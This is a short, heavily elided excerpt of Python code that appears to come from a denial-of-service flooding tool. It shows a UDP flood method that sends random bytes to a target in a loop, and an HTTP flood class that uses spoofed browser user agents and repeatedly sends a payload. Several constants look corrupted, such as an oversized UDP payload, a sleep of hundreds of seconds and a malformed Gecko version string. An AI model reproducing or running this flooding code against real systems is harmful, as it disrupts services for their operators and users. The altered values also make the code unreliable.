...
class Layer4(Thread):
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(550055), self._target):
                continue
        Tools.safe_close(s)
...
class HttpFlood(Thread):
    ...
    def __init__(self,
        ...
        if not useragents:
            useragents: List[str] = [
                ...
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/2055005501 Firefox/69.0',
    ...
    def AVB(self):
        ...
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 550055, 577))
                Tools.send(s, payload)
        Tools.safe_close(s)
